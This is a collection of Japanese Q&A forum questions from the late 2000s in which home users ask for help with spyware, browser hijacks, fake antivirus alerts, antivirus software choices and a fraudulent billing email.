タスクマネージャーで怪しいプロセス（スパイウェアなど）を自分の目で見つけたいのですが詳しくわかりません。 どなたか教えてください。
マカフィーのセキュリティセンターを使用しています。 先日嫁が誤っていくつかのアプリをダウンロードしてしまったようなのですが、それ以降「PCの保護は万全ではありません」というアラートがしょっちゅうでます。 調べてみるとマカフィーのSystemGuardsがオフになっていることによりその警告が出るのですが、オンにしてもまたしばらくするとオフになったり、一度IEを閉じて再度IEを立ち上げたときには必ずオフになっています。 またこれを書いていることに気がついたのですが、マウスの右クリックによりIEで別画面を立ち上げようとしても立ち上げられません。 ダウンロードしてしまったアプリは全て削除したのですが、症状が改善されません。 これはどうなってしまったのでしょうか? ちなみに使用PCはNECのLavie、OSはXP SP2です。 よろしくお願いいたします。
今までshareをつかっていたんですが、逮捕者が出たことを知りました。今やめとけば逮捕されないのでしょうか？
タスクマネージャーのプロセスの中に Connectivity.ED Connectivity.Wi という２個のプロセス（？）がありました。 これは何でしょうか？ スパイウェアやウィルスの類のものなんでしょうか？ ＯＳはWindows2000です。 ご存知の方が見えましたらご教授願います。
ネットのトラブルがあります。 ネットをしていると、 ニフティのＨＰ http://www.nifty.com/が勝手に表示されるのです。ウィンドウを複数開いていても、全てニフティに変わるし、三秒おきにトップページが表示されるのです。（その度にカチカチ音がする）どんなＨＰを見ていてもニフティにかわります。ウィンドウを閉じても再び開くし、ＰＣの電源を落とさない限り、止めるすべは無いのです。 これってウイルスとかスパイウェアとかの関係でしょうか？ 何方か解決策を知りませんか？？
MSNの会話の履歴が漏洩いているようなのですが、いろいろと調べたところ、人為的なことでは仕方ないと思っているのですが、「それ以外」で悪意のある人が会話を盗む方法があるそうなのです。 履歴を残すチェックも外していますし、パソコン自体のセキュリティも、プロの方に見ていただいたり、設定したりといろいろしていますが、（もちろんセキュリティソフトは入れ、アップデート、スキャン等の対策は必ずしています）メッセンジャーの会話が暗号化できない限り、「メッセに関して」は難しいとの返事をもらいました。もちろん、大事なことはメッセでは言わないようにしたいと思ってますが、それでもできる限りのことはしたいと思っています。 MSNの会話の暗号化、またはそれを補助するプロテクトになるようなソフトというのはないのでしょうか？　また、皆様が気をつけていることなどはありますでしょうか？　どんな小さなことでもお聞きしたいと思っていますので、よろしくお願いします。
上記のソフトは、データ・アップデート機能がありません。最新の定義ファイルでスキャンするには、そのたびごとにソフト自体をダウンロードし直さなければならないのでしょうか。 またNormanで初めてスキャンしたあと、「あなたのシステムに加えられた変更は、有効化するために再起動する必要がある。今すぐ再起動しますか？」といった意味の英文の表示が出ました。インストール不要のソフトなのに、なぜシステムに変更が加えられたのでしょうか。 とりあえずAd-Aware 2007でスキャンしてみましたが、スパイウェアの感染ではないようです。ウィルス対策には、NOD32を入れています。 Norman Malware Cleanerをすでにお使いの方、アドバイスをいただけるとありがたく存じます。
私は東芝ダイナブックwindowsXPを使っています。 音楽のサイトを回っていたら急に開いていた窓を閉められ、韓国のサイトのようなものに飛ばされてしまいました。 最初のページはいくらＧｏｏｇｌｅに設定しても http://www.1188.com/?index.html に表示されてしまします。 検索したところ、スパイウェアらしいのですがどう対処したら良いのか説明が難しく、わかりません・・・ よろしければ説明お願いします。
PCのセキュリティについての質問です。 ESETSmartSecurityの購入を考えております。（現在は試用版使用） それにあたっていろいろと調べていましたら、やはり当然のことながら性能上の批判や警告の類のものも相当数発見しました。 目立つものとしてファイアウォールの欠陥や問題の指摘があったのでお聞きしたいのですが、 実際、ESETSmartSecurityのファイアウォールはどうなのですか？ 確かに、権威があり信頼できるらしいサイトの中には性能テストで酷い成績（10段階中1、5％の安全性）などを示しているところもありました。 ちなみにそのファイアウォールてすとで1位（10段階10、90％代の安全性）の成績だったのがCOMODOでした。 ファイアウォールはCOMODOにしたほうがよいと思われますか？（設定等が面倒だと聞くのですが…） もしこれ以外にもESETSmartSecurityの欠点・注意点、その他セキュリティソフトの推薦、有用な情報・ご意見等ございましたら、ご返答していただけると大変助かります。 では、有識者の方をはじめ皆様よろしくお願いします。
PhishWallというソフトはインストールした方が良いでしょうか？ もう一点、無料ソフトですか？それとも有料ソフトですか？
現在ノートンとADWAREを使っています。スパイウエアーの感染を防止するというSPYWAREBLASTERを使おうかどうか検討しているのですが、もしノートンとADWAREで十分であればSPYWAREBLASTERを使うのをやめようと思います。なんかアドバイスはありますか？
ウイルスバスター２００７をアンインストールしたのですが、セキュリティセンターの 　　・ファイアウォール 　　・マルウェア対策 の項目の中からウイルスバスター２００７の表示が消えません。（ファイアウォール：無効、マルウェア：有効） これはこのままでよいのでしょうか。また、消す方法があれば教えてください。 よろしくお願いします。 OSはWINDOWS VISTA HOME BASICです。
ウィルスバスター2008を使用して調べたら、「信頼済み出ないコンピュータが接続されています」と出ました。 なので、例外ルールを追加する、というのをクリックして接続されないようにしました。 念のため無線RANパトロールでパトロール開始し、「接続されていません」となったのを確認しました。 ですが、しばらくすると「信頼済み出ないコンピュータが接続されています」と警告がきました。 IPアドレスをみると、先ほど遮断したものと同じでした。 何度やっても繰り返しで、解決しませんでした。 いったいどうすればいいのでしょうか？
ウイルスバスターを2007から2008にバージョンアップしたものです。 アップしてから、マイクロソフト系のソフト（エクセル、ワード）などは何の障害もないのに、元々パソコンに入っていたbeatjamや後入れの一太郎などを開こうとすると、必ず「不正変更で拒否」という青色のポップアップが現れてしまい、なかなか開くことができません。 しかしながら、ネットに繋げてからこれらのソフトにアクセスすると、何事もなかったようにサクサクとひらくことができるです。 当方としては、わざわざネットに繋がずとも、これらのソフトにアクセスしたいのですが…いい知恵をお貸しください。 ちなみに　http://virus.okwave.jp/qa3803922.html を参考にして、全ての項目を「処理を確認する」にしてみましたが、治りません。助けてください。
先日悪質なサイトを踏んでしまい、Hupigon13とWin32.Delf.uvというスパイウェアが入ってしまいました。 Spybotで駆除しても、再度スキャンするとまた出てきます。 ウィルス対策ソフトはNOD32の体験版を使用しているのですが、起動時に常駐していたNOD32コントロールセンターが常駐しないようになり、NOD32でスキャンしてみると数個のトロイが見つかりました。 その他の症状としてはCtrl+Alt+Deleteで起動するタスクマネージャが起動しなくなり、regeditも起動しなくなりました。 解決策をよろしくお願いします。
インターネットをやり始めて未だ、初心者マークの者です。昨日、興味半分に海外ポルノをアクセス致しましたところ。system error!と書かれたペケ印の警告が表示されました。内容はyour systeme is infeected with dangerous virus!note:strongiy recommend to install antispyware program to clean your system and avoici total crash of your computer!　下に表示されていますOKまたはキャンセル　どう対処すれば良いか解りません。 後の祭りですが反省しております。 よろしくお願いいたします。
セキュリティソフトについてお聞きしたいのですが、 パソコンに avast!、 Ad-Aware 2007、ウィルスセキュリティ ゼロ を入れています。 こんなに必要ないと思うので削除したいのですが、どれを残すべきでしょうか。あるいは、これを入れたほうがいい、というオススメのものがありますか。 私は u-tube は見ませんし、音楽のダウンロードもしません。 仕事上、必要な調べ物の際、海外のHPに行くことはあります。 こんな漠然とした質問をしてお恥ずかしいのですが、他に聞ける相手もいないもので…。 よろしくお願いします。
Spybot-Search＆Destroy1.52にてスキャン中にパソコンの電源が何度や っても落ちます。 　以前にもhttp://oshiete1.goo.ne.jp/qa3941953.html こんな感じの質問をこの場にてさせて頂き良いアドバイスを頂き解決に 至りましたが今回もほとんど似たような事ですが・・・。 対策としてCnsMin Remover for Windows 2000/XPをやってもだめで 次はCWShredderによるCoolWebSearchの除去をやっても全く解決しませ んでした。一旦このソフトを削除して再度インストールしてやり直して も同じです！CnsMis言うのが出てましたので電源が落ちる前に一旦スキ ャンを中断、停止して削除してして見てもスキャンの真ん中位まで進む と、やはり電源が落ちます。削除するとそれ以降はCnsMisは検出されま せんが解決しません、参りました・・・。 　やはり、最悪リカバリーするしかないでしょうか？ ちなみに私のパソコン環境はXp-sp2とセキュリティ関係のソフトは Spybot-Search＆Destroy1.52、AD-AWARE2008、AVAST4.8home、 SpywareBlaster! を使っています。これらの組み合わせで何年間も 使って来て今までこんな問題はありませんでした。 宜しくアドバイスをお願い致します。
先週ウイルスバスター２００８製品版を購入してインストール してから使ったところ、ブラウザ等は機敏なのですが、 クロノスなどのオンラインゲームをする際、ロード時間が２～３倍ほどかかってしまいます。 ウイルスバスターなので、遅くなるのはわかっていますが、ＰＣも３月に自作したばかりで、そんな性能に余裕がないということはないのですが・・どうしたら動作が機敏になるでしょうか？ ご教授願います。 ちなみに自作ＰＣスペック(最低限） CPU Core2 duo E6750 メモリ　2G グラボ　8600GT OS Vista SP1
ウイルスバスターオンラインスキャンで解凍したいファイル（rar）の中にスパイウェアがあると言われました。 CRCK_CRCKDOWNというものらしいですが、ウェブにも詳しい情報が載ってないので、もし知ってる方がおられれば教えて下さい。 スパイウェアについて調べてると、どうも正規の商品にも入っているらしく、ウイルスとは違うので、そこまで神経質になる必要はないですか？ 今のとっころzipを解凍してスパイウェアに一度感染した後、目的のファイルを取得した後、バックアップをとって、システムの復元をする。こんな方法しか思いつきません。これでスパイウェアのない元の状態になるんでしょうか？ あんまりパソコンに詳しくないので、検討外れの事を言っていたらすいません。どなたか詳しい方、アドバイスの方よろしくお願いします。
こんにちは ウイルスバスタ2007で毎週ウイルスとスパイウエアの検索を行っていますが、毎回必ず10個程度のcookieが頭につくスパイウエアが検索されます。それぞれの詳細を見てみると、『通常のcookieで危害をもたらすものではないので安心下さい」と出るものと詳細不明と出るものが半分づつあります。いずれも最終的には毎回削除しています。最近は詳細を調べたところで最後は全て削除するので詳細を調べずすぐに削除しています。但し、毎週検索するたびごとに10個程度のスパイウエアが見つかることは変わりません。このような状態が１年近く続いています。来月はウイルスバスタの更新月です。 このような状況ですが何か問題はあるでしょうか？ （毎週10個程度のスパイウエアが見つかると言うことは、何か改善すべき問題を含んでいると言うことなのでしょうか？） よろしくお願いします。
ノートン２００７を現在使用しています。後２５日程度で期限切れとなり延長キーの購入を勧められています。 しかし、価格が高いので迷っています。 質問は、 (1)延長キーはシマンテックストア以外で購入できるかどうか (2)延長キーを無視してノートン２００８を購入し、インストールしても良いのか (3)その他ウイルス対策のお勧めの方法 以上、ご存知の方にお答え頂ければ、幸いです。 よろしくお願いします。
WindowsXP SP1のパソコンにウイルスが入り、知らない間に迷惑メールの発信元になっているという連絡がプロバイダーからありました。（すぐ切断し今は別のパソコンから入力していますが）「トロイの木馬」のようなスパイウエアーと思われます。今までウイルスソフトは使っていませんでした。反省しています。ところが、ソフトを入れようと思ってもヤマダ電機などで売っているソフトはすべてSP2以上対象です。オンラインでダウンロードできるフリーソフトでは効きません。１回リムーブしてもすぐ戻ってしまいます。メモリーを増やせばインストールできるかも知れない、と店員は言っていました。今のままで取れる対策はありますか。教えてください。
今日、閲覧履歴全てを削除し、ニコニコ動画を見に行った所初めてavast!から警告を受けました。 内容は「マルウェアを発見しました。ですがマルウェアがコンピュータに入る前にavastが遮断しました。」といった感じです。 で、「接続を切断する」ことで対処するということに。 ところがページを買える度、更新するたびにそれが出てくるのです。 一応動画を見れることは見れるのですが、さすがに毎回警告されるのは困ります。 はっきり言ってＰＣにはかなり疎いので対処の方法がさっぱり分かりません。 回答いただくにもどんな情報を載せればいいのかも分かりません。 ですがこの情報でもし回答できる方がおりましたらよろしくお願いします。 また情報が足りない場合もその都度お礼の所に書きたいと思います。
いつからそうなったのか分からないのですが、インターネットを起動すると　【現在のWEBページはインターネットのサイトを開こうとしています。　許可しますか？ 　　　 現在のサイトAbout:blank 　インターネットサイトAbout:blanktxst/html (はい）　　　　　　　　　　　（いいえ）】 とゆうセキュリティの警告メッセージがでてきます。 他にも、お気に入りを見ようとしたり閉じようとしたり、戻るボタンをおしてもこの警告がでます（なぜか2回でます） 毎回いいえをクリックするのですが・・・ フリーのスパイウェア駆除ソフトなど試してみたのですが一向に治りません。 どうすればこの現象をなくすことができるのでしょうか、教えてください＞＜ ちなみに今のところ普通にインターネットを使えているのでこれといって害はないように思えますが（逆に怖いです；；）気味が悪いので何とかしたいです。 OSはXPです。
タイトルの通りなのですが、 Ad-Aware 2007 Free をパソコンから削除できません。 途中でエラーが出ていたので、検索して関係するすべての ファイルを削除したのですが、まだプログラムの追加と削除に 残っています。しかも、削除ボタンはなくなっています。 どうすれば削除できるか教えて下さい。 よろしくお願い致します。
VirusHeatが取り付いて、外す事が出来ません。 セキュリティーソフトのupdateさえ邪魔される状態です。
キングソフトのセキュリティ対策ソフトが完全無料っていうふうになって無料でダウンロード、アップデートができるみたいですけど、これってどうなんですか？ほんとに信頼できるソフトなんでしょうか？また、ほんとにずっと無料で使い続けていけるものなんですか！？
ウィルスバスター２００７で手動検出をした所ADWARE_BESTOFFERSというスパイウェアが検出されました。 http://www.trendmicro.co.jp/vinfo/grayware/ve_gr … このサイトを見た所、危険度は低いで情報漏えいの危険性が中になっています。 すでに、削除を行い、もう一度スキャンしてもADWARE_BESTOFFERSは検出されませんでした。 しかし、ウィルスバスターのホームページにはユーザのキー入力操作情報を収集しますとも書いてあります。ここで質問なのですが、このADWARE_BESTOFFERSが潜伏してある間に入力した情報は漏洩した可能性があるのでしょうか？具体的には、ログインパスワードなどのことなのですが・・・・かなり不安です・・・パスワードを変えたほうがよいのでしょうか？ よろしくお願いします。
パソコンは詳しくないのに、メールで送られてきたホームページをつい明けてしまって・・・高額な請求書が届いてどう対応したらよいか困っています。 パソコンの事は詳しくないので、初心者に教えてください。宜しくお願いします。 順序だてて説明をします。 以前より、エキサイトのフリーメールを利用していました。自宅のパソコンで、エロページを見ていたのですが、ある時から、エキサイトのフリーメールのアドレスに、出会い系みたいな（エツチなホームページ）ものの紹介（ホームページのURL）が、メールで届くようになりました。別に気にせずにほっておきました。そして、エキサイトのフリーメールの受信欄の中に、残しておきたいURLを自分宛にメール送信して残しておき、エロホームページを見るときは、エキサイトのフリーメールから見に行っていました。（伝わったでしょうか？） そして、今回のトラブルの件ですが、会社で（会社のNWには属していない独立したパソコン）、エキサイトメールのチェックをしょうとした時に、間違ってそのメールを開いてしまい、URLをクリックしてしまいました。いつもとは違った画面になりました。多分この時だと思います。ウイルスバスターを作動しました。よくないことですが、ちょっとエッチ画像も見てしまいました。 その後、「萌えPeach事務局」から、料金滞納通知が届いています。会社のパソコン（今回、クリックしてしまったパソコン）ではなく、エキサイトのフリーメールに何十通も届いていました。 請求額99050円でした。期日を過ぎたので払ってほしい～と長々と文書がありました。 現状は、ほっておいています。 【質問】 ・ほっておいている状況（エキサイトメールは着信拒否にしました）で　すが、この対応で大丈夫でしょうか？ ・お客様サポート窓口のフリーダイヤルが案内されていましたが、無視　する予定です。 ・送られてきたメール【請求メール】には、会員ID、プロバイダー名、　IPアドレス等が掲載されていましたが、そこから調べて、会社のパソ　コン（今回クリックしてしまったパソコン）に請求が届いたりしない　でしょうか？ 　プロバイダー名のところに、自分の会社名になっています？ ・会社のパソコン（今回の請求が送られてきたパソコン）には、まだ何　も送られてきてはいないようです。 ・ほっておくのが一番だと考えているのですが、経験がある方、このよ　うな件に詳しい方からの、対処方法等を伺いたくて・・・。 長文になってしまい、読みにくいとは思いますが、何卒お知恵をお貸しください。宜しくお願いします。 上記の内容で下記に記入をした、hiji2001です。 変な事をしてしまい、記入できなくなってしまったので、再度書きました。 答えを書いて頂いた方には大変申し訳ありません。 放置したままでよいとの事だったので、ほっとしていたところです。 追加で質問なのですが、回答の文にも出でいたことなのですが・・・今回、URLをクリックしてしまったパソコンには、請求書メールは飛んできませんよね？このパソコンのメーラーのメールアドレスはわからないということでいいのですよね？（IPアドレスからではわからない） 今回、URLをクリックしてしまつたパソコンですが、会社のネットワークには属していないのですが、会社名義（近いもの）で単独（Bフレッツ）に近い状態で稼動しているパソコンです。なので、ここに請求メールが届くのは非常にまずいことです。 併せて、宜しくお願いします。
パソコンは詳しくないのに、メールで送られてきたホームページをつい明けてしまって・・・高額な請求書が届いてどう対応したらよいか困っています。 パソコンの事は詳しくないので、初心者に教えてください。宜しくお願いします。 順序だてて説明をします。 以前より、エキサイトのフリーメールを利用していました。自宅のパソコンで、エロページを見ていたのですが、ある時から、エキサイトのフリーメールのアドレスに、出会い系みたいな（エツチなホームページ）ものの紹介（ホームページのURL）が、メールで届くようになりました。別に気にせずにほっておきました。そして、エキサイトのフリーメールの受信欄の中に、残しておきたいURLを自分宛にメール送信して残しておき、エロホームページを見るときは、エキサイトのフリーメールから見に行っていました。（伝わったでしょうか？） そして、今回のトラブルの件ですが、会社で（会社のNWには属していない独立したパソコン）、エキサイトメールのチェックをしょうとした時に、間違ってそのメールを開いてしまい、URLをクリックしてしまいました。いつもとは違った画面になりました。多分この時だと思います。ウイルスバスターを作動しました。よくないことですが、ちょっとエッチ画像も見てしまいました。 その後、「萌えPeach事務局」から、料金滞納通知が届いています。会社のパソコン（今回、クリックしてしまったパソコン）ではなく、エキサイトのフリーメールに何十通も届いていました。 請求額99050円でした。期日を過ぎたので払ってほしい～と長々と文書がありました。 現状は、ほっておいています。 【質問】 ・ほっておいている状況（エキサイトメールは着信拒否にしました）で　すが、この対応で大丈夫でしょうか？ ・お客様サポート窓口のフリーダイヤルが案内されていましたが、無視　する予定です。 ・送られてきたメール【請求メール】には、会員ID、プロバイダー名、　IPアドレス等が掲載されていましたが、そこから調べて、会社のパソ　コン（今回クリックしてしまったパソコン）に請求が届いたりしない　でしょうか？ 　プロバイダー名のところに、自分の会社名になっています？ ・会社のパソコン（今回の請求が送られてきたパソコン）には、まだ何　も送られてきてはいないようです。 ・ほっておくのが一番だと考えているのですが、経験がある方、このよ　うな件に詳しい方からの、対処方法等を伺いたくて・・・。 長文になってしまい、読みにくいとは思いますが、何卒お知恵をお貸しください。宜しくお願いします。
先ほど、FireFoxをダウンロードしたところ マカフィーサイトアドバイザーとかでてきました。 今、マカフィーの製品の インターネットセキュリティスイートwithサイトアドバイザという マカフィーの製品を使ってます。 それで同意というところを押すと http://www.siteadvisor.com/ が出てきましたが、これを利用するのは無料ですか？ 年会費、使用費、初会費などお金が必要ですか？
同じような質問はたくさんあったのですがどうしても解決できずにおります。 これ以上自分でいろいろいじっていては大変なことになるのでは と思い、質問させていただくことにしました。 パソコンについては詳しくありません。 以下は自分なりに調べてやってみたことを書いてみます。 パソコンを起動するとRUNDLLのエラー画面がでます。 OSはXPです。マカフィーが入ってます。 C:\PROGRA~1\GBPLUG~1\gbiehcef.dllを読み込み中にエラーが発生しました。 指定されたモジュールが見つかりません。 というものです。 原因としては以前にアドウェアと思われるもののために パソコンの調子がおかしくなったために たぶんgbiehcefだったと思いますが、通常の状態では 使用中だとかなんとかで削除できなかったためセーフモードで削除しました。 それからパソコンの調子は治りました。 そして、レジストリをいうものが残っているために このような現象がおきるのだと調べていてわかったので レジストリの削除に挑戦してみました。 ファイル名を指定して実行→msconfig→スタートアップ そこには上記コマンドは見当たりませんでした。 RegCleanerを試して見ましたがファイルがないというやつを 全部削除したらなんかおかしなことになってしまったので 怖くなって全部復元してそのままです。 それから、EasyCleanerではgbiehcefがあったので削除しましたが エラー表示は改善されません。 再度検索してみましたが今度はありませんでした。 ファイル名を指定して実行→regedit→HKEY_LOCAL_MACHINE→ WINDOWS NT→WINLOGON→Notify→gbiehcefがあったので それを全部削除してみましたが改善されませんでした。 ちなみにregedit→HKEY_LOCAL_MACHINE→WINDOWS→CurrentVersion→Run にはありませんでした。 最後にSpyBotを使って見ましたが見つかりませんでした。 なにかといろいろやってみたので 何をどうやったのか記憶がごっちゃになっているところもあると思います。 補足が必要であれば教えてください。 エラーの表示がでたからといって問題があるわけではないのですが どうしても気になってしまって・・・。 知識なしにいじりまくってしまったので怖くなってきたのもあります。 エラー表示が出なくなる方法と 私が行ったことで問題があれば教えて下さい。 よろしくお願いいたします。
知らないうちに私のメールアドレスを使って友人にメールが送られたようです。送信された後すぐに友人から連絡があって発覚し、とりあえずパスワードだけ変更し、過去の質問集を検索してみたのですが、同じものがなかったので質問することにしました！異なる点としては… ・数十人ずつにわけてアドレス帳全員に送信している。しかもＢＣＣで！ ・アドレス帳にもう存在しないアドレスがあってもmailer daemonなどを受信していない。なので、友人から連絡がなければ全く気づいてないです。 送られたメールの内容はお店の広告とURL,連絡先(フリーメール二つ)です。ちなみにURLはオンラインショップになっており住所等もありましたが身に覚えのないものです。 これはどういう状況でしょうか？ウィルスには感染していないようですが…。spybotなどでスパイウェア対策をすればよいのでしょうか！？
こんにちは、今回はレジストリの変更について質問させて頂きます。 状態/内容 ・使用OS：windowsXp ・セキュリティソフト：avast、ZoneAlarm、SpybotS&D(ver1.5.2.20) ・http://www.lattice.co.jp/ja/download/xvl-player/ …サイトから[XVL Player Ver. 8.5a]をインストールした際、SpybotS&Dから「レジストリの変更を許可しますか？」とアナウンス。 ・変更を許可した。 ということなんですが、今まではレジストリについて意味が解ってないので変更はすべて拒否していました。PC状態は特に変化がないのですが、少し気になるので質問させていただきました。 　もしレジストリを変更以前に戻す場合はSpyBotS&Dの変更以前に作成したレジストリバックアップからでよいのでしょうか？ お願します。
お教えください。スパイウェアを何回駆除しても同じのが出ます。名前は　MySideSearch というスパイウェアです。前回も質問しましたが今でもIEを起動すると　http://*****.biz/bc/123kah.php　に勝手にアクセスします。このスパイウェアと関係ありますか？　常時安全セキュリティ２４を利用してます。
spywareblaster4.0をインストールした後にいちばん最初に起動するとき、SpywareBlaster Tutorialという画面が出てきて、Updating Optionsで、Automatic Updatingか、Manual Updatingを選ぶようになります。 しかし、ネットでは、spywareblasterの自動アップデートは年間約9.5ドルの有料サービスであるという情報がありました。 この画面でAutomatic Updatingを選択すると、年間9.5ドルを支払うことになるのでしょうか？それとも、ｖ4.0は無料で自動アップデートできるようになったのでしょうか？？ ご存知の方がいれば、お教え下さい。よろしくお願いします。
先日、セキュリティソフトについて質問しました結果、皆さんの回答の中からAvast最新版を導入しました。 今度は非常駐のスパイウェア対策ソフトの導入を検討中です。 お勧めのソフトが有れば教えていただけますでしょうか？ OSはXPSP３、メモリは２Gです。
Internet閲覧中に、”MalwareWar”というSpy＆Spamをプロテクトするというインチキな会社のsiteがパソコンに入りこみました。Nroton Internet Securityでガードしていたのに残念です。InterntExpressのタイトルバーにもはまり込んで、1分間隔くらいで「Downroadせよ」と要求します。”MalwareWar”を駆除する方法を教えて下さい。
つい先日、アクセスしたくもないのに、ポップアップ広告を消そうとしたときに間違えてクリックしてしまいました。 ブラクラのように窓が沢山出て、一旦パソコンがフリーズしました。 でも窓は全部消すことができましたが、デスクトップ背景には英語で、 「スパイウェアが入りました。駆除プログラムで排除してください」 というような表記が青い背景ででてきました。 昨日色々なスパイウェアを試してみましたが、 AD-AWARE、Spybot、あと駆除が有料なところを使いました。 AD-AWAREでは全て出てきたものを駆除しても直らず、 Spybotでは殆ど駆除できたものの、１つだけできませんでした。 その為、デスクトップの背景が勝手に変更されることはなくなりましたが、スクリーンセーバーのようにゴキブリが時々画面上に現れます。 ウィルス対策にウィルスキラー2008を使っているので、 その設定で拒否したため、ゴキブリが画面上を這っていても、 直ぐにもとの画面に戻る事ができます。 ゴキブリが出ている間、スカイプや他のプログラムが異常に遅くなったり、フリーズしたりシャットダウンされてしまうので、駆除したいのですが、他に良いフリースパイウェア駆除ソフトがわかりません。 ジョークプログラムも駆除できるものはありますでしょうか？
WindowsVISTA SP1でＮＴＴのセキュリティ対策ツールver.15を使用しています。 これだけだとセキュリティ対策が正直不安なんです。 併用OKなスパイウェアはありますでしょうか？ 常駐型でなければ問題ありませんか？ アドウェア対策のAD-Aware2008は使用可能でしょうか？ 前に使っていたPCにセキュリティ対策ツールを使っていたんですが、アンインストールした後、adware2008を入れてアドウェア検索をしたところ238件もあったので不安になりました。併用可能な対策ソフトを教えてください。
パソコンを起動する度にウイルスの除去操作がされ、自動的に削除されるのですがWindowsがそれを認識できないらしく、タスクに赤丸×印で警告をしてきます。「アンチスパイウエァをダウンロードしろ」と指示されますがクリックをしても何も開けず同じ警告をするだけです。更にコンパネで設定してある最初に開くホームページをグーグルに変える設定も自動で行われます。海外の怪しいアダルトサイトを観てからおかしくなってしまいました。お解りになる方いらっしゃいましたら宜しくお願い致します。
XPのシステムの復元を行ったらSpybotが英語表記になってしまい 日本語にもどせません。 Languageにも日本の国旗がなく再インストールしようにも プログラムの追加と削除からアンインストールしようとすると 英語のエラーが出てアンインストールもできません。 日本語表示にする方法を教えて下さい。
１週間くらい前から、数日ごとにパソコンを使用していない時間に勝手にメールが送られているようで困っています。なぜ気づいたかと言うと、受信トレイに差出人が「Mail Delivery Subsystem (mailer-daemon@google.com)」で、タイトルが「Delivery Status Notification (Failure)」というメールが多いときで日に数十件来ているからです。英語なので良く分からないのですが、中身を見てみるとどうやら、私のメールアドレス（ｈｏｔｍａｉｌです）から、適当なアドレス（数字とアルファベットの組み合わせ）にメールが送られ、それが届かなかったというような内容のようです。ウイルスやスパイウエアかと思い、ウイルスチェック（マカフィー）とスパイウエアチェック（ｓｐｙｂｏｔとＡｄ－Ａｗａｒｅでｓａｆｅ　ｍｏｄｅも）を行い、対策は行いましたが、昨日も送られているようです（送信エラーのメールは１件のみ）。送信トレイに何も残ってないので、この送信エラーのメールだけが送られているのか、ほかに多数のメール（相手に届いている）が送られているのか分からないのですが、どうすればいいのでしょうか？実害がないようなので無視してもいいかも知れませんが、何か気持ちが悪いので、何か対策方法を教えていただけないでしょうか。
WindowsVistaを使用しています。 最初にパソコンを買ったときにノートンとウェブルートスパイスウィーパーが入っていました。 両方ともお試し期間が過ぎようとしているのですが、ノートンのほうは更新しました。Norton Internet Security 2008です。 スパイスウィーパーのほうは更新したほうがいいのでしょうか？ 同じような製品なのでしょうか？ 詳しい方がいらっしゃいましたら回答よろしくお願いします。
ＩＥのセキュリテイ設定の制限付きサイトに「悪質サイト」を大量にマトメて登録できる ie-spyad なる有名なソフトを入れて見ましたが、ダウンロードして解凍したファイルの総計サイズがナント＜７メガバイト近く＞も有るではありませんか　URLリストだけで一メガバイトも必要ないとは思いますが、あとは登録用のプログラムやヘルプファイルなどなどあわせてもせいぜい、２メガバイト以下で済むと思いますが？　どうなんでしょうか？ 何か悪質なプログラムを逆にインストされているのではないか？と心配になります　そういえば、ads_regとかいった登録実行ファイルの完了メッセージが出るまでに一分ぐらい掛かりました、これは総合セキュリテイソフトをインスト完了するぐらいの時間であまりに掛かり過ぎだと思いますが？　どうなんでしょうか？ 諸先生方よろしくお願いします
vista home premium ですがSpybot-S&D1.5.2 のImmunize-免疫 で免疫しようとしてもほとんど Unprotectedで残ります。 英語で管理者権限で行ってくださいというような警告はでますが、 PCのアカウントは１つしか作ってなくそれは管理者アカウント のはずですがなぜかわかりますか？ updateはspybotsd_includes.exe でしました
いつもお世話になります。 ウィンドウズXPにウィルスバスター（2008年）で対応していますが、インターネットを閲覧した後、必ず毎回３つのスパイウェアに感染しています。 駆除しても、また感染し駆除しの繰り返しです。 危険度は低いようですが、困っています。ちなみに、アダルトサイトとか、怪しげなサイトは閲覧していません。 恐らくですが、下記HPを閲覧すると感染しているようなのですが、もしかしたら正常なクッキーで、ウィルスバスターが敏感すぎるのでしょうか？　感染しても気にしなくて大丈夫なのでしょうか？ 詳しい方教えてください。 感染し駆除されるスパイウェア１→　COOKIE_REVSCI 　　　　　　　　　　　　　　　　　２→　COOKIE_DOUBLECLICK 　　　　　　　　　　　　　　　　　３→　COOKIE_Pointroll よろしくお願いします。
こんにちは、スパイウェアが見つかって削除したのですが、スパイウェアが入っていた時期に行った行動や情報はどこかに漏れたということですよね？ これから先、なにかしらの被害が来るのでしょうか？ やばいですよね？
ブログに投稿した記事を削除したいのですがどうしたらよいでしょうか
先日、カスペルスキーでHidden Data Sendingの警告が出ることについて質問させていただいた者です。ヘルプとサポートセンターからシステムの復元を実行しようとする度に、Hidden Data Sendingの警告が出ます。（アクセサリのシステムツールからシステムの復元をしようとしたときには、何も問題なく進みます） その後、カスペルスキーのルートキットスキャンで再スキャンしたところ、not-a-virus:FraudTool.Win32.WinAntiVirus.2006が見つかりましたが、削除には失敗しました。 その後、spybotを入れてスキャンしてみたところ、 Winsoftware.WinAntiVirusPro2006　と WinAntiVirusPro2006 のデータファイル（？）と、レジストリ値の設定（？）が計４つ出てきました。 これらの四つすべて削除しようとしたのですが、一つだけ削除に失敗したものがありました。「警告　いくつかの問題点が修正／削除できません；理由はファイルがメモリ上にある為です.....」という警告文が出ました。再起動直後に再びspybotでスキャンをすれば、削除できるかもしれなかったらしいので、そうしたのですが、そうすると今度は、削除されなかったスパイウェア自体が見つかりませんでした。さらに、セーフモードでもう一度スキャンしたのですが、削除されなかったスパイウェアは見つかりませんでした。 しかし、ヘルプとサポートセンターからシステムの復元をしようとすると、今でもHidden Data Sendingの警告が出るので、中にまだスパイウェアによる問題が残っているのではないかと思います。 以下が、spybotによるスパイウェア削除のログです。 --- Report generated: 2008-05-10 21:46 --- Winsoftware.WinAntiVirusPro2006: [SBI $9B8A2FDD] 設定 (レジストリ値, fixed) HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Control\Session Manager\BootStera Winsoftware.WinAntiVirusPro2006: [SBI $C1ECE295] データ (ファイル, fixed) C:\Documents and Settings\myown\Local Settings\Temp\wa6Support.log WinAntiVirusPro2006: [SBI $48113326] 設定 (レジストリ値, fixed) HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Session Manager\BootStera WinAntiVirusPro2006: [SBI $C8D098E7] 設定 (レジストリ値, fixing failed) HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\BootStera 最後のfixing failedとなったものを削除したいのですが、どうしたらいいでしょうか？？ よろしくお願い申し上げます。
